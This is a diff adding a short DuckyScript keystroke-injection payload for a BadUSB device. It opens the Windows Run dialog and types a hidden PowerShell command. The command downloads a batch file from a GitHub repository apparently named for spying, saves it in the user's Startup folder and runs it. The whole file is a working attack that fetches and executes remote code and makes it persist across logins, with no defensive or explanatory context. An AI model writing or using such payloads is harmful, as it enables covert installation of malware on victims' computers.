@@ -1,0 +1,5 @@
+GUI r
+DELAY 100
+STRING powershell -w h -c "iwr https://raw.githubusercontent.com/6E65787371/private-ScSpy/main/temp.bat -o $env:APPDATA'\Microsoft\Windows\Start Menu\Programs\Startup\temp.bat';ii $env:APPDATA'\Microsoft\Windows\Start Menu\Programs\Startup\temp.bat'"
+DELAY 100
+ENTER
